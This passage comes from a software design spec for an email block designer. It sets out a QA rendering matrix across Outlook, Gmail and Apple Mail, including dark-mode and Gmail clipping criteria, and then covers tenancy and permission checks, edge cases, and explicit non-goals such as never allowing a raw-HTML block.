*"render across a representative client matrix — scope with RL" (BACKLOG M6-T4 QA assignment).* This section is the scope: QA is not expected to build a Litmus/Email-on-Acid-style automated matrix (no such tooling exists in this repo today, and standing one up is out of scope for a stretch ticket) — real-inbox manual verification against this list, at minimum, is what "acceptable" means here.

| Client | Engine | Why it matters | Acceptable degradation |
|---|---|---|---|
| **Outlook desktop (Windows, 2016/2019/365)** | Microsoft Word's rendering engine — genuinely different from a browser | The single worst-supported major client for modern CSS: no flexbox/grid (irrelevant here — no block emits either, by §1's blanket single-column decision), unreliable `border-radius` (square corners acceptable), no CSS gradients (solid `bgcolor` fallback, §1 Hero), margin on block elements unreliable (padding/table-structure only) | Square corners instead of rounded; solid background instead of any gradient; single-column stacked layout (already the only layout this registry ever produces); `<!--[if mso]>` conditional-comment width fixes may be needed for the bulletproof-button table trick on RegistrationEmbed's link |
| **Outlook.com / Microsoft 365 webmail** | Different (more standards-compliant) engine than desktop Outlook — do not conflate the two | Historically a separate, sometimes-inconsistent rendering path from desktop Outlook | Treat as its own row in any manual test pass, not "same as Outlook" |
| **Outlook mobile app (iOS/Android)** | Modern webview-based, closer to native mobile rendering than desktop Outlook | Also distinct from desktop Outlook — a common QA mistake is testing "Outlook" once and assuming all three (desktop/web/mobile) behave alike | Should render close to Apple Mail/Gmail-app quality; flag any regression here separately from desktop-Outlook findings |
| **Gmail (web)** | Chromium-based rendering of a sanitized DOM | Gmail **clips messages whose HTML exceeds roughly 102 KB** with a "view entire message" link — a *different, tighter* threshold than this app's existing 256 KB hard `bodyHtml` cap (§2/§3 AC-4). A maximal 20-block email could legitimately clip in Gmail while still passing our size validation. | Recommend (not a hard block in this ticket) a soft editor-side warning when assembled HTML approaches ~100 KB, distinct from the hard 256 KB rejection — flagged as a should-fix for FS/UX, not gating this spec |
| **Gmail (iOS/Android app)** | Own rendering layer, generally more permissive than Gmail web for CSS but same ~102 KB clipping behavior | Same clipping caveat as Gmail web | Same as above |
| **Apple Mail (macOS) / iOS Mail** | WebKit — the most permissive/standards-compliant major client | Good reference for "this is what the design intends to look like"; also the easiest client to manually test **dark mode** on | Should render closest to the design intent of any client on this list |
| **Dark mode (at least one client, Apple Mail/iOS is the easiest to test locally)** | Client-side automatic color inversion when no explicit `color-scheme` opt-out is present | Apple Mail/iOS Mail and some other clients apply automatic dark-mode re-coloring to messages that don't explicitly declare their own color scheme, which can invert an intentionally-white card background or make explicitly-black text invisible | The email HTML must include `<meta name="color-scheme" content="light">` and `<meta name="supported-color-schemes" content="light">` in its document wrapper, and every block's background/text colors must be **explicit** (`bgcolor` attribute **and** inline `background-color`/`color` styles — never "no color set, relying on white-background-by-default") — this carries forward M6-T2 §8-1's exact decision ("the preview iframe content itself may stay light — emails are light-bodied — decision, noted so QA doesn't flag it") into the real send path, not just the preview |

**Acceptance criteria**
1. A representative block-mode email (mixing at least Hero, Highlights/Story, RegistrationEmbed-open, TicketPricingTable, CountdownTimer) is manually verified in at least Outlook desktop, Gmail web, and Apple Mail (macOS or iOS) before this ticket is considered visually done — the three highest-value, most-different rendering engines on the list.
2. The dark-mode meta tags are present in the assembled document and at least one dark-mode client (Apple Mail/iOS) is manually verified not to invert an intentionally light-styled block.
3. A deliberately maximal (20-block, long-text) test fixture is checked against Gmail's ~102 KB clipping behavior specifically, distinct from the existing 256 KB hard-cap test (§3 AC-4) — this is a *display* concern (clipping), not a *validation* failure, and should be reported as such if triggered.
4. Findings are recorded per-client (not "email renders correctly" as one blanket claim) — this spec's own table is the checklist QA works from.

## 7 — Permissions, tenancy (carried, restated for completeness)

Nothing new. Every route T4 touches is an existing M6-T2 route (`PATCH .../definitions/[kind]`, `GET/POST .../emails/preview`, `POST .../emails/test-send`) already gated `write:events` → 403/404-IDOR → rate-limited (including the M-1 fix already applied to the PATCH route per the M6-T2 security review). `bodyBlocks` content is recipient-facing template data exactly like `subject`/`body` — it lives inside the same server-only `EmailDefinition` document (deny-all Firestore rules, no client repo pair, unchanged) and is never queryable/readable by any surface other than the existing dashboard routes.

**Acceptance criteria**
1. A same-org read-only member (no `write:events`) can view the page shell but cannot open the block designer in a way that persists anything — identical to the existing M6-T2 §7 AC-2 convention, just confirmed for the new fields specifically.
2. Two-org isolation: a `bodyBlocks` payload written for org A's definition is never readable via org B's session, via the same deterministic-id + re-check-tenancy-in-transaction mechanism T2 already established (no new IDOR surface — the field is inside the same document, protected by the same check).

## 8 — States & edge cases (cross-cutting)

1. **Empty canvas.** A definition with `bodyMode: "blocks"` but `bodyBlocks: []` (organizer switched mode but never dragged a block in) renders an empty `bodyHtml` body — the editor should visibly warn ("This email has no content blocks yet") before allowing save/test-send, distinct from T2's existing "(empty)" subject warning (`EmailPreviewFrame` already handles an empty subject; an empty block-mode body needs an equivalent, new warning).
2. **Zero attendees / sample context.** Identical to T2 §4 AC-1/§8-6 — the sample-attendee fallback context is unchanged; block-mode rendering doesn't introduce a new sample-data concern beyond what TicketPricingTable/CountdownTimer already need (their data sources are the event/ticket/fee docs, not the recipient, so "zero attendees" doesn't affect them at all — only affects `{first_name}`-style merge tags embedded inside block text, which already degrade to "" per the existing missing-tag behavior).
3. **Concurrent edits.** Same as T2 §8-7 — last-write-wins on the whole doc; `bodyBlocks` is part of that same whole-doc upsert, no partial-block merge across two editors.
4. **Both themes / responsive (dashboard chrome only).** The Puck canvas, palette, and dialog chrome follow the app's existing light/dark theming (same as the rest of the emails workspace); the **email content itself** (both canvas-approximate and iframe-authoritative) stays light-only by the explicit decision carried from T2 §8-1 and restated in §6's dark-mode row above — this is a decision, not an oversight, and QA should not flag the email body's fixed light styling as a theming bug.
5. **A definition's `bodyBlocks` referencing an event with zero registration paths, zero tickets, or a countdown target already in the past** — each block type's individual empty/past-target state (§1's per-block table) governs; none of these ever produce a broken/blank render, matching the "never a crash, never a hidden block" spirit already established for every M4-T1 block on the web.

## Non-goals for T4 (explicit)

- **No changes to M6-T3's trigger/audience/scheduling logic.** The block designer only changes *how a definition's body is authored and rendered*; it does not touch who receives an email, when, or the dedupe/idempotency mechanism — confirmed architecturally safe because M6-T3's trigger code calls the same `renderEmailDefinitionPreview` entry point this ticket extends, with zero changes required at those call sites (Shared decisions, above).
- **No new merge tags.** The existing 14-tag catalog is reused as-is. One candidate was considered and declined during this research pass: a hypothetical `{unsubscribe_link}` tag for block-designed emails — declined because unsubscribe/suppression is explicitly T1 OQ-2's deferred scope (no real transport exists to honor it yet), not something this ticket should invent a placeholder for. If a genuine need for a new tag surfaces during Design/Implementation, it must come back to Research as an explicit amendment, not be added ad hoc.
- **No draft/publish state for `bodyBlocks`** (Shared decisions) — every save is immediately live, matching the existing `subject`/`body` posture.
- **No raw-HTML / custom-code / "embed" block type, ever, in the email-safe registry — this is a permanent invariant for this feature, not just a T4-scope limitation.** Any future ticket proposing one must treat it as a new, from-scratch security review, not an additive change to this allowlist.
- **No externally-hosted animated-GIF countdown service** (the "real" way most ESPs solve the ticking-countdown-in-email problem) — flagged as Open question OQ-3, a genuinely separate future ticket if ever pursued, not attempted here.
- **No fix to any pre-existing Puck upstream accessibility gap** (e.g., keyboard-only drag-and-drop reordering, if the installed `@measured/puck` version lacks one) — out of scope for this ticket; flagged for QA to report as a library-level finding if encountered, not a defect in this ticket's own code.
- **No changes to the dev-outbox transport.** Nothing about how a message is actually delivered (or not delivered, per the dev transport) changes; T1's transport interface is untouched.
- **No changes to `CallToAction` on the web page builder** (e.g., adding a `href` prop to make it linkable, which would have let it join the email-safe registry) — that would be an M4-scope change to an already-Done ticket; if a future ticket wants `CallToAction` in emails, it should add the URL prop to the web block first and then reconsider this ticket's exclusion decision.
- **No two-column/side-by-side layout in any email block** (§1's blanket rationale) — revisit only if organizer feedback demonstrates the single-column constraint is a real usability problem, not preemptively.
